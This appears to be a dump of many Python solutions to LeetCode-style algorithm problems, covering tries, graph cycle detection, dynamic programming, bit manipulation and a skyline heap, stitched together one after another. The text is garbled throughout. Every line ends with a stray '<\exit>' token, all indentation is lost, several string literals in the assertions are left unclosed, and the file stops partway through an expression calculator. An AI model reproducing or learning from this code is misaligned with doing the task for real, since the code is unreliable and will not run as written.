from collections import defaultdict<\exit>
class TwoSum(object):<\exit>
def __init__(self):<\exit>
self.hash_map = defaultdict(int)<\exit>
def add(self, number):<\exit>
self.hash_map[number] += 1<\exit>
def find(self, value):<\exit>
return any(<\exit>
value-k in self.hash_map and (value-k != k or self.hash_map[k] > 1)<\exit>
for k in self.hash_map<\exit>
)<\exit>
def find_TLE(self, value):<\exit>
for k in self.hash_map.keys():<\exit>
target = value - k<\exit>
if target in self.hash_map and (target != k or self.hash_map[target] > 1):<\exit>
return True<\exit>
return False<\exit>
class Solution:<\exit>
def titleToNumber(self, s):<\exit>
sig = 1<\exit>
ret = 0<\exit>
for i in xrange(len(s)-1, -1, -1):<\exit>
ret += sig*(ord(s[i])-ord('A')+1)<\exit>
sig *= 26<\exit>
return ret<\exit>
class Solution:<\exit>
def trailingZeroes(self, n):<\exit>
cnt = 0<\exit>
while n:<\exit>
n /= 5<\exit>
cnt += n<\exit>
return cnt<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class BSTIterator:<\exit>
def __init__(self, root):<\exit>
self.cur = root<\exit>
self.stk = []<\exit>
def hasNext(self):<\exit>
return self.cur or self.stk<\exit>
def next(self):<\exit>
while self.cur:<\exit>
self.stk.append(self.cur)<\exit>
self.cur = self.cur.left<\exit>
nxt = self.stk.pop()<\exit>
self.cur = nxt.right<\exit>
return nxt.val<\exit>
import sys<\exit>
class Solution:<\exit>
def calculateMinimumHP(self, dungeon):<\exit>
m = len(dungeon)<\exit>
n = len(dungeon[0])<\exit>
F = [[sys.maxint for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(m-1, -1, -1):<\exit>
for j in xrange(n-1, -1, -1):<\exit>
if i == m-1 and j == n-1:<\exit>
F[i][j] = max(1, 1-dungeon[i][j])<\exit>
else:<\exit>
path = min(F[i+1][j], F[i][j+1])<\exit>
F[i][j] = max(1, path-dungeon[i][j])<\exit>
return F[0][0]<\exit>
def calculateMinimumHP_error(self, dungeon):<\exit>
m = len(dungeon)<\exit>
n = len(dungeon[0])<\exit>
if m == 1 and n == 1:<\exit>
return 1-min(0, dungeon[0][0])<\exit>
F = [[-sys.maxint-1 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if i == 1 and j == 1:<\exit>
F[i][j] = dungeon[i-1][j-1]<\exit>
else:<\exit>
F[i][j] = max(F[i-1][j], F[i][j-1])+dungeon[i-1][j-1]<\exit>
F[i][j] = min(F[i][j], dungeon[i-1][j-1])<\exit>
return 1-F[-1][-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculateMinimumHP([[-3, 5]]) == 4<\exit>
assert Solution().calculateMinimumHP([[2, 1], [1, -1]]) == 1<\exit>
class Solution:<\exit>
def largestNumber(self, nums):<\exit>
nums = map(str, nums)<\exit>
nums.sort(cmp=self.cmp, reverse=True)<\exit>
nums = "".join(nums)<\exit>
nums = nums.lstrip("0")<\exit>
if not nums:<\exit>
nums = "0"<\exit>
return nums<\exit>
def cmp(self, a, b):<\exit>
order = 1<\exit>
if len(a) > len(b):<\exit>
order = -1<\exit>
a, b = b, a<\exit>
for i in xrange(len(a)):<\exit>
if int(a[i]) != int(b[i]):<\exit>
return order*(int(a[i])-int(b[i]))<\exit>
if len(a) == len(b):<\exit>
return 0<\exit>
return order*self.cmp(a, b[len(a):])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().largestNumber(<\exit>
[4704, 6306, 9385, 7536, 3462, 4798, 5422, 5529, 8070, 6241, 9094, 7846, 663, 6221, 216, 6758, 8353, 3650, 3836,<\exit>
8183, 3516, 5909, 6744, 1548, 5712, 2281, 3664, 7100, 6698, 7321, 4980, 8937, 3163, 5784, 3298, 9890, 1090,<\exit>
7605, 1380, 1147, 1495, 3699, 9448, 5208, 9456, 3846, 3567, 6856, 2000, 3575, 7205, 2697, 5972, 7471, 1763,<\exit>
1143, 1417, 6038, 2313, 6554, 9026, 8107, 9827, 7982, 9685, 3905, 8939, 1048, 282, 7423, 6327, 2970, 4453,<\exit>
5460, 3399, 9533, 914, 3932, 192, 3084, 6806, 273, 4283, 2060, 5682, 2, 2362, 4812, 7032, 810, 2465, 6511, 213,<\exit>
2362, 3021, 2745, 3636, 6265, 1518, 8398]) == "98909827968595339456944893859149094902689398937839883538183810810780707982784676057536747174237321720571007032685668066758674466986636554651163276306626562416221603859725909578457125682552954605422520849804812479847044453428339323905384638363699366436503636357535673516346233993298316330843021297028227452732697246523622362231322812216213206020001921763154815181495141713801147114310901048<\exit>
class Solution(object):<\exit>
def reverseWords(self, s):<\exit>
self.reverse(s, 0, len(s))<\exit>
i = 0<\exit>
while i < len(s):<\exit>
j = i+1<\exit>
while j < len(s) and s[j] != " ":<\exit>
j += 1<\exit>
self.reverse(s, i, j)<\exit>
i = j+1<\exit>
def reverse(self, s, start, end):<\exit>
i = start<\exit>
j = end<\exit>
while i < j-1:<\exit>
s[i], s[j-1] = s[j-1], s[i]<\exit>
i += 1<\exit>
j -= 1<\exit>
if __name__ == "__main__":<\exit>
lst = list("the sky is blue")<\exit>
Solution().reverseWords(lst)<\exit>
assert "".join(lst) == "blue is sky the<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findRepeatedDnaSequences(self, s: str) -> List[str]:<\exit>
ret = set()<\exit>
seen = set()<\exit>
for i in range(len(s) - 10 + 1):<\exit>
sub = s[i:i+10]<\exit>
if sub in seen and sub not in ret:<\exit>
ret.add(sub)<\exit>
else:<\exit>
seen.add(sub)<\exit>
return list(ret)<\exit>
class Solution:<\exit>
def findRepeatedDnaSequences(self, s):<\exit>
if len(s) < 10:<\exit>
return []<\exit>
s = map(self.mapping, list(s))<\exit>
h = set()<\exit>
ret = set()<\exit>
cur = 0<\exit>
for i in xrange(10):<\exit>
cur <<= 2<\exit>
cur &= 0xFFFFF<\exit>
cur += s[i]<\exit>
h.add(cur)<\exit>
for i in xrange(10, len(s)):<\exit>
cur <<= 2<\exit>
cur &= 0xFFFFF<\exit>
cur += s[i]<\exit>
if cur in h and cur not in ret:<\exit>
ret.add(cur)<\exit>
else:<\exit>
h.add(cur)<\exit>
return map(self.decode, ret)<\exit>
def decode(self, s):<\exit>
dic = {<\exit>
0: "A",<\exit>
1: "C",<\exit>
2: "G",<\exit>
3: "T"<\exit>
}<\exit>
ret = []<\exit>
for i in xrange(10):<\exit>
ret.append(dic[s%4])<\exit>
s >>= 2<\exit>
return "".join(reversed(ret))<\exit>
def mapping(self, a):<\exit>
dic = {<\exit>
"A": 0,<\exit>
"C": 1,<\exit>
"G": 2,<\exit>
"T": 3,<\exit>
}<\exit>
return dic[a]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findRepeatedDnaSequences("AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT") == ['CCCCCAAAAA', 'AAAAACCCCC']<\exit>
class Solution:<\exit>
def maxProfit(self, k, prices):<\exit>
n = len(prices)<\exit>
if k >= n:<\exit>
return self.maxProfit_unlimited_transactions(prices)<\exit>
l = [0 for _ in xrange(k+1)]<\exit>
g = [0 for _ in xrange(k+1)]<\exit>
gmax = 0<\exit>
for i in xrange(1, n):<\exit>
diff = prices[i] - prices[i-1]<\exit>
for j in xrange(k, 0, -1):<\exit>
l[j] = max(g[j-1]+diff, l[j]+diff)<\exit>
g[j] = max(l[j], g[j])<\exit>
gmax = max(gmax, g[j])<\exit>
return gmax<\exit>
def maxProfit_unlimited_transactions(self, prices):<\exit>
profit = 0<\exit>
for i in xrange(1, len(prices)):<\exit>
profit += max(0, prices[i] - prices[i-1])<\exit>
return profit<\exit>
if __name__ == "__main__":<\exit>
print Solution().maxProfit(2, [1, 2, 4])<\exit>
class Solution:<\exit>
def rotate(self, nums, k):<\exit>
n = len(nums)<\exit>
k %= n<\exit>
temp = nums[:n-k]<\exit>
for i in xrange(n):<\exit>
if i < k:<\exit>
nums[i] = nums[n-k+i]<\exit>
else:<\exit>
nums[i] = temp[i-k]<\exit>
class Solution:<\exit>
def reverseBits(self, n):<\exit>
ret = 0<\exit>
BITS = 32<\exit>
for i in xrange(BITS):<\exit>
ret += n&1<\exit>
if i == BITS-1: break<\exit>
ret <<= 1<\exit>
n >>= 1<\exit>
return ret<\exit>
class Solution:<\exit>
def hammingWeight(self, n):<\exit>
cnt = 0<\exit>
while n:<\exit>
cnt += n&1<\exit>
n >>= 1<\exit>
return cnt<\exit>
class Solution:<\exit>
def rob(self, nums):<\exit>
n = len(nums)<\exit>
f = [0 for _ in xrange(n+2)]<\exit>
for i in xrange(2, n+2):<\exit>
f[i] = max(<\exit>
f[i-1],<\exit>
f[i-2] + nums[i-2]<\exit>
)<\exit>
return f[-1]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def rightSideView(self, root):<\exit>
cur_lvl = []<\exit>
nxt_lvl = []<\exit>
ret = []<\exit>
if root:<\exit>
cur_lvl.append(root)<\exit>
while cur_lvl:<\exit>
ret.append(cur_lvl[-1].val)<\exit>
while cur_lvl:<\exit>
cur = cur_lvl.pop(0)<\exit>
if cur.left: nxt_lvl.append(cur.left)<\exit>
if cur.right: nxt_lvl.append(cur.right)<\exit>
cur_lvl = nxt_lvl<\exit>
nxt_lvl = []<\exit>
return ret<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]<\exit>
def numIslands(self, grid):<\exit>
m = len(grid)<\exit>
if m < 1:<\exit>
return 0<\exit>
n = len(grid[0])<\exit>
if n < 1:<\exit>
return 0<\exit>
cnt = 0<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not visited[i][j] and grid[i][j] == "1":<\exit>
self.dfs(grid, i, j, visited)<\exit>
cnt += 1<\exit>
return cnt<\exit>
def dfs(self, grid, i, j, visited):<\exit>
m = len(grid)<\exit>
n = len(grid[0])<\exit>
visited[i][j] = True<\exit>
for dir in self.dirs:<\exit>
I = i+dir[0]<\exit>
J = j+dir[1]<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J] and grid[I][J] == "1":<\exit>
self.dfs(grid, I, J, visited)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numIslands(["1", "1"]) == 1<\exit>
class Solution:<\exit>
def rangeBitwiseAnd(self, m, n):<\exit>
pos = 0<\exit>
while m != n:<\exit>
pos += 1<\exit>
m >>= 1<\exit>
n >>= 1<\exit>
return n << pos<\exit>
class Solution:<\exit>
def isHappy(self, n):<\exit>
nxt = 0<\exit>
appeared = set()<\exit>
while True:<\exit>
nxt += (n%10)*(n%10)<\exit>
n /= 10<\exit>
if n == 0:<\exit>
if nxt == 1:<\exit>
return True<\exit>
if nxt in appeared:<\exit>
return False<\exit>
appeared.add(nxt)<\exit>
n = nxt<\exit>
nxt = 0<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def removeElements(self, head, val):<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
while pre.next:<\exit>
cur = pre.next<\exit>
if cur.val == val:<\exit>
pre.next = cur.next<\exit>
continue<\exit>
pre = pre.next<\exit>
return dummy.next<\exit>
import math<\exit>
class Solution:<\exit>
def countPrimes(self, n):<\exit>
if n < 3:<\exit>
return 0<\exit>
is_prime = [True for _ in xrange(n)]<\exit>
is_prime[0], is_prime[1] = False, False<\exit>
for i in xrange(2, int(math.sqrt(n))+1):<\exit>
if is_prime[i]:<\exit>
for j in xrange(i*i, n, i):<\exit>
is_prime[j] = False<\exit>
return is_prime.count(True)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countPrimes(1500000) == 114155<\exit>
class Solution:<\exit>
def isIsomorphic(self, s, t):<\exit>
m = {}<\exit>
mapped = set()<\exit>
for i in xrange(len(s)):<\exit>
if s[i] not in m and t[i] not in mapped:<\exit>
m[s[i]] = t[i]<\exit>
mapped.add(t[i])<\exit>
elif s[i] in m and m[s[i]] == t[i]:<\exit>
pass<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def reverseList(self, head: ListNode) -> ListNode:<\exit>
prev = None<\exit>
cur = head<\exit>
while cur:<\exit>
nxt = cur.next<\exit>
cur.next = prev<\exit>
prev = cur<\exit>
cur = nxt<\exit>
return prev<\exit>
def reverseList_complex(self, head: ListNode) -> ListNode:<\exit>
if not head:<\exit>
return None<\exit>
prev = head<\exit>
cur = head.next<\exit>
head.next = None<\exit>
while prev and cur:<\exit>
nxt = cur.next<\exit>
cur.next = prev<\exit>
prev = cur<\exit>
cur = nxt<\exit>
return prev<\exit>
class ListNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution(object):<\exit>
def reverseList(self, head):<\exit>
if not head:<\exit>
return head<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
cur = pre.next<\exit>
while pre and cur:<\exit>
pre, cur.next, cur = cur, pre, cur.next<\exit>
dummy.next.next = None<\exit>
return pre<\exit>
class Solution:<\exit>
def canFinish(self, numCourses, prerequisites):<\exit>
V = [[] for _ in xrange(numCourses)]<\exit>
for edge in prerequisites:<\exit>
V[edge[0]].append(edge[1])<\exit>
visited = [False for _ in xrange(numCourses)]<\exit>
marked = [False for _ in xrange(numCourses)]<\exit>
for i in xrange(numCourses):<\exit>
if not visited[i]:<\exit>
if self.dfs_have_cycle(V, i, visited, marked):<\exit>
return False<\exit>
return True<\exit>
def dfs_have_cycle(self, V, i, visited, marked):<\exit>
if marked[i]:<\exit>
return True<\exit>
marked[i] = True<\exit>
for neighbor in V[i]:<\exit>
if not visited[neighbor] and self.dfs_have_cycle(V, neighbor, visited, marked):<\exit>
return True<\exit>
marked[i] = False<\exit>
visited[i] = True<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canFinish(2, [[1, 0], [0, 1]]) is False<\exit>
class TrieNode:<\exit>
def __init__(self):<\exit>
self.ended = False<\exit>
self.children = {}<\exit>
class Trie:<\exit>
def __init__(self):<\exit>
self.root = TrieNode()<\exit>
def insert(self, word):<\exit>
cur = self.root<\exit>
for w in word:<\exit>
if w not in cur.children:<\exit>
cur.children[w] = TrieNode()<\exit>
cur = cur.children[w]<\exit>
cur.ended = True<\exit>
def search(self, word):<\exit>
cur = self.root<\exit>
for w in word:<\exit>
if w in cur.children:<\exit>
cur = cur.children[w]<\exit>
else:<\exit>
return False<\exit>
if not cur.ended:<\exit>
return False<\exit>
return True<\exit>
def startsWith(self, prefix):<\exit>
cur = self.root<\exit>
for w in prefix:<\exit>
if w in cur.children:<\exit>
cur = cur.children[w]<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
import sys<\exit>
class Solution:<\exit>
def minSubArrayLen(self, s, nums):<\exit>
n = len(nums)<\exit>
S = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
S[i] = S[i-1]+nums[i-1]<\exit>
lo, hi = 0, 1<\exit>
mini = sys.maxint<\exit>
while hi <= n:<\exit>
if S[hi]-S[lo] >= s:<\exit>
mini = min(mini, hi-lo)<\exit>
lo += 1<\exit>
else:<\exit>
hi += 1<\exit>
return mini if mini != sys.maxint else 0<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minSubArrayLen(7, [2, 3, 1, 2, 4, 3]) == 2<\exit>
class Solution:<\exit>
def findOrder(self, numCourses, prerequisites):<\exit>
V = {}<\exit>
for i in xrange(numCourses):<\exit>
V[i] = []<\exit>
for edge in prerequisites:<\exit>
V[edge[1]].append(edge[0])<\exit>
return self.topological_sort(V)<\exit>
def topological_sort(self, V):<\exit>
visited = set()<\exit>
marked = set()<\exit>
ret = []<\exit>
for k in V.keys():<\exit>
if k not in visited:<\exit>
if not self.dfs(V, k, visited, marked, ret):<\exit>
return []<\exit>
ret.reverse()<\exit>
return ret<\exit>
def dfs(self, V, k, visited, marked, ret):<\exit>
if k in marked:<\exit>
return False<\exit>
marked.add(k)<\exit>
for neighbor in V[k]:<\exit>
if neighbor not in visited:<\exit>
if not self.dfs(V, neighbor, visited, marked, ret):<\exit>
return False<\exit>
marked.remove(k)<\exit>
visited.add(k)<\exit>
ret.append(k)<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findOrder(2, [[0, 1], [1, 0]]) == []<\exit>
class TrieNode:<\exit>
def __init__(self):<\exit>
self.ended = False<\exit>
self.children = {}<\exit>
class WordDictionary:<\exit>
def __init__(self):<\exit>
self.root = TrieNode()<\exit>
def addWord(self, word):<\exit>
cur = self.root<\exit>
for w in word:<\exit>
if w not in cur.children:<\exit>
cur.children[w] = TrieNode()<\exit>
cur = cur.children[w]<\exit>
cur.ended = True<\exit>
def search(self, word):<\exit>
return self.__search(word, self.root)<\exit>
def __search(self, word, cur):<\exit>
if not word:<\exit>
return cur.ended<\exit>
w = word[0]<\exit>
if w != ".":<\exit>
if w in cur.children:<\exit>
return self.__search(word[1:], cur.children[w])<\exit>
else:<\exit>
return False<\exit>
else:<\exit>
for child in cur.children.values():<\exit>
if self.__search(word[1:], child):<\exit>
return True<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
dic = WordDictionary()<\exit>
dic.addWord("a")<\exit>
assert dic.search(".") == True<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
dirs = [(0, 1), (0, -1), (-1, 0), (1, 0)]<\exit>
class TrieNode:<\exit>
def __init__(self):<\exit>
self.word = None<\exit>
self.children = defaultdict(TrieNode)<\exit>
class Solution:<\exit>
def findWords(self, board: List[List[str]], words: List[str]) -> List[str]:<\exit>
root = self.construct(words)<\exit>
m, n = len(board), len(board[0])<\exit>
visited = [[False for _ in range(n)] for _ in range(m)]<\exit>
ret = set()<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
self.dfs(board, visited, i, j, root, ret)<\exit>
return list(ret)<\exit>
def dfs(self, board, visited, i, j, cur, ret):<\exit>
m, n = len(board), len(board[0])<\exit>
visited[i][j] = True<\exit>
c = board[i][j]<\exit>
if c in cur.children:<\exit>
nxt = cur.children[c]<\exit>
if nxt.word is not None:<\exit>
ret.add(nxt.word)<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J]:<\exit>
self.dfs(board, visited, I, J, nxt, ret)<\exit>
visited[i][j] = False<\exit>
def construct(self, words):<\exit>
root = TrieNode()<\exit>
for w in words:<\exit>
cur = root<\exit>
for c in w:<\exit>
cur = cur.children[c]<\exit>
cur.word = w<\exit>
return root<\exit>
class TrieNode(object):<\exit>
def __init__(self, char):<\exit>
self.char = char<\exit>
self.word = None<\exit>
self.children = {}<\exit>
def __repr__(self):<\exit>
return repr(self.char)<\exit>
class Trie(object):<\exit>
def __init__(self):<\exit>
self.root = TrieNode(None)<\exit>
def add(self, word):<\exit>
word = word.lower()<\exit>
cur = self.root<\exit>
for c in word:<\exit>
if c not in cur.children:<\exit>
cur.children[c] = TrieNode(c)<\exit>
cur = cur.children[c]<\exit>
cur.word = word<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dirs = [(0, 1), (0, -1), (-1, 0), (1, 0)]<\exit>
def findWords(self, board, words):<\exit>
trie = Trie()<\exit>
for word in words:<\exit>
trie.add(word)<\exit>
ret = set()<\exit>
marked = set()<\exit>
for i in xrange(len(board)):<\exit>
for j in xrange(len(board[0])):<\exit>
self.dfs(board, i, j, trie.root, marked, ret)<\exit>
return list(ret)<\exit>
def dfs(self, board, i, j, parent, marked, ret):<\exit>
m = len(board)<\exit>
n = len(board[0])<\exit>
marked.add((i, j))<\exit>
c = board[i][j]<\exit>
if c in parent.children:<\exit>
cur = parent.children[c]<\exit>
if cur.word:<\exit>
ret.add(cur.word)<\exit>
for dir in self.dirs:<\exit>
row = i+dir[0]<\exit>
col = j+dir[1]<\exit>
if 0 <= row < m and 0 <= col < n and (row, col) not in marked:<\exit>
self.dfs(board, row, col, cur, marked, ret)<\exit>
marked.remove((i, j))<\exit>
class Solution:<\exit>
def rob(self, nums):<\exit>
n = len(nums)<\exit>
if n < 2:<\exit>
return sum(nums)<\exit>
F = [0 for _ in xrange(n-1+2)]<\exit>
for i in xrange(2, n+1):<\exit>
F[i] = max(F[i-1], F[i-2]+nums[i-2])<\exit>
ret = F[-1]<\exit>
F = [0 for _ in xrange(n-1+2)]<\exit>
for i in xrange(2, n+1):<\exit>
F[i] = max(F[i-1], F[i-2]+nums[i-1])<\exit>
ret = max(ret, F[-1])<\exit>
return ret<\exit>
class Solution:<\exit>
def shortestPalindrome(self, s):<\exit>
s_r = s[::-1]<\exit>
l = len(s)<\exit>
if l < 2:<\exit>
return s<\exit>
T = [0 for _ in xrange(l+1)]<\exit>
T[0] = -1<\exit>
pos = 2<\exit>
cnd = 0<\exit>
while pos <= l:<\exit>
if s[pos-1] == s[cnd]:<\exit>
T[pos] = cnd+1<\exit>
cnd += 1<\exit>
pos += 1<\exit>
elif T[cnd] != -1:<\exit>
cnd = T[cnd]<\exit>
else:<\exit>
T[pos] = 0<\exit>
cnd = 0<\exit>
pos += 1<\exit>
i = 0<\exit>
b = 0<\exit>
while i+b < l:<\exit>
if s[i] == s_r[i+b]:<\exit>
i += 1<\exit>
if i == l:<\exit>
return s<\exit>
elif T[i] != -1:<\exit>
b = b+i-T[i]<\exit>
i = T[i]<\exit>
else:<\exit>
b += 1<\exit>
i = 0<\exit>
return s_r+s[i:]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().shortestPalindrome("abcd") == "dcbabcd"<\exit>
import heapq<\exit>
class Solution:<\exit>
def findKthLargest(self, nums, k):<\exit>
h = []<\exit>
n = len(nums)<\exit>
for i, v in enumerate(nums):<\exit>
if i < k:<\exit>
heapq.heappush(h, v)<\exit>
else:<\exit>
if v <= h[0]:<\exit>
continue<\exit>
heapq.heappop(h)<\exit>
heapq.heappush(h, v)<\exit>
return heapq.heappop(h)<\exit>
if __name__ == "__main__":<\exit>
print Solution().findKthLargest([3, 2, 1, 5, 6, 4], 2)<\exit>
class Solution:<\exit>
def combinationSum3(self, k, n):<\exit>
ret = []<\exit>
self.dfs(k, n, [], ret)<\exit>
return ret<\exit>
def dfs(self, remain_k, remain_n, cur, ret):<\exit>
if remain_k == 0 and remain_n == 0:<\exit>
ret.append(list(cur))<\exit>
return<\exit>
if remain_k * 9 < remain_n or remain_k * 1 > remain_n:<\exit>
return<\exit>
start = 1<\exit>
if cur:<\exit>
start = cur[-1] + 1<\exit>
for i in xrange(start, 10):<\exit>
cur.append(i)<\exit>
self.dfs(remain_k - 1, remain_n - i, cur, ret)<\exit>
cur.pop()<\exit>
if __name__ == "__main__":<\exit>
assert Solution().combinationSum3(3, 9) == [[1, 2, 6], [1, 3, 5], [2, 3, 4]]<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def containsDuplicate(self, nums):<\exit>
d = Counter(nums)<\exit>
for k, v in d.items():<\exit>
if v > 1:<\exit>
return True<\exit>
return False<\exit>
from collections import defaultdict, namedtuple<\exit>
import heapq<\exit>
class Building(object):<\exit>
def __init__(self, h):<\exit>
self.h = h<\exit>
self.deleted = False<\exit>
def __cmp__(self, other):<\exit>
assert isinstance(other, Building)<\exit>
return other.h - self.h<\exit>
Event = namedtuple('Event', 'starts ends')<\exit>
class Solution:<\exit>
def getSkyline(self, buildings):<\exit>
events = defaultdict(lambda: Event(starts=[], ends=[]))<\exit>
for left, right, height in buildings:<\exit>
building = Building(height)<\exit>
events[left].starts.append(building)<\exit>
events[right].ends.append(building)<\exit>
heap_h = []<\exit>
cur_h = 0<\exit>
ret = []<\exit>
for x, event in sorted(events.items()):<\exit>
for building in event.starts:<\exit>
heapq.heappush(heap_h, building)<\exit>
for building in event.ends:<\exit>
building.deleted = True<\exit>
while heap_h and heap_h[0].deleted:<\exit>
heapq.heappop(heap_h)<\exit>
new_h = heap_h[0].h if heap_h else 0<\exit>
if new_h != cur_h:<\exit>
cur_h = new_h<\exit>
ret.append([x, cur_h])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().getSkyline([[2, 9, 10], [3, 7, 15], [5, 12, 12], [15, 20, 10], [19, 24, 8]]) == \<\exit>
[[2, 10], [3, 15], [7, 12], [12, 0], [15, 10], [20, 8], [24, 0]]<\exit>
import heapq<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def containsNearbyDuplicate(self, nums, k):<\exit>
d = defaultdict(list)<\exit>
for i, v in enumerate(nums):<\exit>
heapq.heappush(d[v], i)<\exit>
for v in d.values():<\exit>
if len(v) > 1:<\exit>
pre = heapq.heappop(v)<\exit>
while v:<\exit>
cur = heapq.heappop(v)<\exit>
if cur-pre <= k:<\exit>
return True<\exit>
pre = cur<\exit>
return False<\exit>
from collections import OrderedDict<\exit>
class Solution:<\exit>
def containsNearbyAlmostDuplicate(self, nums, k, t):<\exit>
if k < 1 or t < 0:<\exit>
return False<\exit>
if t == 0:<\exit>
return self.containsNearByDuplicate(nums, k)<\exit>
od = OrderedDict()<\exit>
for n in nums:<\exit>
key = n/t<\exit>
for j in (-1, 0, 1):<\exit>
m = od.get(key+j)<\exit>
if m is not None and abs(m-n) <= t:<\exit>
return True<\exit>
while len(od) >= k:<\exit>
od.popitem(False)<\exit>
od[key] = n<\exit>
return False<\exit>
def containsNearByDuplicate(self, nums, k):<\exit>
od = OrderedDict()<\exit>
for n in nums:<\exit>
if od.get(n):<\exit>
return True<\exit>
while len(od) >= k:<\exit>
od.popitem(False)<\exit>
od[n] = n<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
print Solution().containsNearbyAlmostDuplicate([-3, 3], 2, 4)<\exit>
class Solution:<\exit>
def maximalSquare(self, matrix):<\exit>
m = len(matrix)<\exit>
if m < 1: return 0<\exit>
n = len(matrix[0])<\exit>
if n < 1: return 0<\exit>
for i in xrange(m):<\exit>
matrix[i] = map(int, matrix[i])<\exit>
maxa = 0<\exit>
to_top = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
to_left = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
square_width = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if matrix[i-1][j-1] == 0:<\exit>
continue<\exit>
to_top[i][j] += to_top[i-1][j] + matrix[i-1][j-1]<\exit>
to_left[i][j] += to_left[i][j-1] + matrix[i-1][j-1]<\exit>
square_width[i][j] = min(<\exit>
square_width[i-1][j-1]+1,<\exit>
to_left[i][j],<\exit>
to_top[i][j],<\exit>
)<\exit>
maxa = max(maxa, square_width[i][j])<\exit>
return maxa*maxa<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def countNodes(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
h = self.get_height(root)<\exit>
h_r = self.get_height(root.right)<\exit>
if h == h_r+1:<\exit>
return 2**(h-1)-1+1+self.countNodes(root.right)<\exit>
else:<\exit>
return 2**(h-2)-1+1+self.countNodes(root.left)<\exit>
def get_height(self, cur):<\exit>
h = 0<\exit>
while cur:<\exit>
h += 1<\exit>
cur = cur.left<\exit>
return h<\exit>
class Solution_TLE:<\exit>
def __init__(self):<\exit>
self.depth = 0<\exit>
self.cnt = 0<\exit>
self.stopped = False<\exit>
def countNodes(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
self.get_depth(root)<\exit>
self.fanthom(root, 1)<\exit>
return 2**(self.depth-1)-1+self.cnt<\exit>
def get_depth(self, root):<\exit>
self.depth += 1<\exit>
if root.left:<\exit>
self.get_depth(root.left)<\exit>
def fanthom(self, root, depth):<\exit>
if self.stopped:<\exit>
return<\exit>
if not root.left and not root.left:<\exit>
if self.depth == depth:<\exit>
self.cnt += 1<\exit>
else:<\exit>
self.stopped = True<\exit>
return<\exit>
if root.left:<\exit>
self.fanthom(root.left, depth+1)<\exit>
if root.right:<\exit>
self.fanthom(root.right, depth+1)<\exit>
def countNodes_TLE(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
return 1+self.countNodes(root.left)+self.countNodes(root.right)<\exit>
if __name__ == "__main__":<\exit>
pass<\exit>
class Solution:<\exit>
def computeArea(self, A, B, C, D, E, F, G, H):<\exit>
S_A = (C-A)*(D-B)<\exit>
S_B = (G-E)*(H-F)<\exit>
l = max(0, min(C, G)-max(A, E))<\exit>
h = max(0, min(D, H)-max(B, F))<\exit>
return S_A + S_B - l*h<\exit>
if __name__ == "__main__":<\exit>
assert Solution().computeArea(-2, -2, 2, 2, -2, -2, 2, 2) == 16<\exit>
from typing import List<\exit>
class Solution:<\exit>
def calculate(self, s: str) -> int:<\exit>
ret, _ = self.eval(s + "\0", 0, [])<\exit>
return ret<\exit>
def eval(self, s: str, start: int, stk: List[int]) -> int:<\exit>
prev_op = "+"<\exit>
operand = 0<\exit>
i = start<\exit>
while i < len(s):<\exit>
if s[i] == " ":<\exit>
pass<\exit>
elif s[i].isdigit():<\exit>
operand = operand * 10 + int(s[i])<\exit>
elif s[i] in ("+", "-", ")", "\0"):<\exit>
if prev_op == "+":<\exit>
stk.append(operand)<\exit>
elif prev_op == "-":<\exit>
stk.append(-operand)<\exit>
